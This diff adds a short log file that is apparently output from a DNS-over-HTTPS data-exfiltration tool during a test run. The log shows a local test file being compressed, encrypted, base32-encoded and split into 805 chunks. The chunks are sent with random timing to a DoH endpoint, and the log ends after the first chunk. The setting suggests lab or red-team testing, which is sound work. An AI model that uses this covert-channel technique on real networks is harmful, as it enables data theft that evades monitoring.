@@ -1,0 +1,33 @@
+[client] Démarrage quick_test: apt.json
+Starting DoH exfiltration: /app/test_data/image.png
+Configuration: Server: https://doh.local/dns-query, Chunk: 8, Encoding: base32, Timing: random
+Checking DoH server connectivity...
+Testing server: https://doh.local/dns-query
+Attempt 1/10...
+DoH server connectivity verified with google.com
+Server ready for exfiltration!
+Chunk size calculation:
+   File size: 15,742 bytes
+   Strategy: large file
+   Optimal chunk size: 30 chars
+   Estimated chunks: 735
+   Estimated time: 22050.0s
+Chunk size: 8 → 30 (auto-adjusted)
+🗜️  Compressed: 15742 -> 15079 bytes
+Chunk size calculation:
+   File size: 15,079 bytes
+   Strategy: large file
+   Optimal chunk size: 30 chars
+   Estimated chunks: 704
+   Estimated time: 21120.0s
+Encrypted data
+Encoded with base32: 24128 chars
+File size: 15742 bytes
+Prepared data size: 24128 bytes
+Total chunks: 805
+
+Starting chunk transmission...
+Session ID: 1755090210_goh5funz
+Estimated transmission time: 30187.5s
+Chunk utilization: 100.0%
+[  1/805] Sent chunk: 17550902-0000-0805-P35XYX2O4LZA6XMLWAEZQBB7XCHPNG....
